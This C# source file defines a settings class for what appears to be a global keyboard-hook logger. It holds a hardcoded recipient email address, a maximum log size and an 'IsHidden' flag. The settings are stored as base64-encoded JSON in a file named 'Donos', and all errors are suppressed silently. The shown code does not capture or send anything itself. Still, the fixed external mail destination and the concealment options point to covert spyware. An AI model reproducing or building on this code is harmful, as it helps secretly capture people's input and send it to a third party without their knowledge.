using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.IO;
using System.Windows.Forms;

namespace GlobalHook
{
    
    class SettingAdapter
    {
        public string DestinationEmail { get; set; } = "grapadyra@mail.ru";
        public int MaxSize { get; set; } = 2;
        public bool IsHidden { get; set; }

        public void Init()
        {
            try
            {
                var rawOut = File.ReadAllText("Donos");
                var json = Encoding.UTF8.GetString(Convert.FromBase64String(rawOut));
                dynamic saved = JsonConvert.DeserializeObject(json);
                DestinationEmail = saved.DestinationEmail;
                MaxSize = saved.MaxSize;
                IsHidden = saved.IsHidden;
            }
            catch (Exception e)
            {
                Save();
            }
        }

        public void Save()
        {
            try
            {
                var json = JsonConvert.SerializeObject(this);
                var encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(json));
                File.WriteAllText("Donos", encoded);
            }
            catch (Exception)
            {
                //ignore
            }
        }
    }
}
